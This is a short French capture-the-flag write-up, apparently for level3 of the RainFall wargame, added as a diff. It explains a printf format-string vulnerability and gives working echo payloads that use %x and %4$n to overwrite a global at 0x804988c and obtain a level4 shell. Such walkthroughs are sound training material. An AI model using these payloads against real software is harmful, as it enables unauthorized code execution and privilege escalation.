@@ -1,0 +1,51 @@
+En analysant le binaire, on voit que celui ci 
+affiche notre string via un printf,
+mais en la mettant en premier argument.
+printf(buf)
+Cela nous permet d'injecter des %x par 
+exemple pour lire sur la stack, ou meme
+mieux, des %n pour ecrire le nombre d'octets
+precedent le %n.
+
+"%x.%x.%x" nous affiche 1 a 1 les adresses de la stack
+et on peut faire:
+"%3$x" pour voir directement la troieme adresse
+
+finalement, "\x\x\x\x" nous permet de mettre
+une adresse sur la stack pour la rendre accessible
+pour printf
+
+0x080484da <+54>:    mov    0x804988c,%eax
+0x080484df <+59>:    cmp    $0x40,%eax
+on voit qu'un cmp avec 0x804988c nous permet
+d'acceder a un bloc executant un shell 
+
+on cherche alors a modifier 0x804988c pour ecrire
+0x40 dedans (64)
+
+pour cela, on commence par faire cela:
+
+echo -e "\x8c\x98\x04\x08%1\$x.%2\$x.%3\$x.%4\$x.%5\$x." | ./level3
+�200.b7fd1ac0.b7ff37d0.804988c.78243125.
+
+"\x8c\x98\x04\x08" nous permet de placer 804988c sur la stack
+et on voit qu'elle est accessible en 4eme argument
+
+echo -e "\x8c\x98\x04\x08%4\$x" | ./level3
+affiche donc:
+�804988c
+
+et echo -e "\x8c\x98\x04\x08%4\$n" | ./level3
+permet d'y ecrire
+
+Je vois avec gdb que cette simple instruction
+ecrit 4 octet a 804988c
+
+Je rajoute donc 60 char devant et:
+
+echo -e "\x8c\x98\x04\x08aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%4\$n" > /tmp/input
+level3@RainFall:~$ cat /tmp/input - | ./level3
+�aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Wait what?!
+whoami
+level4
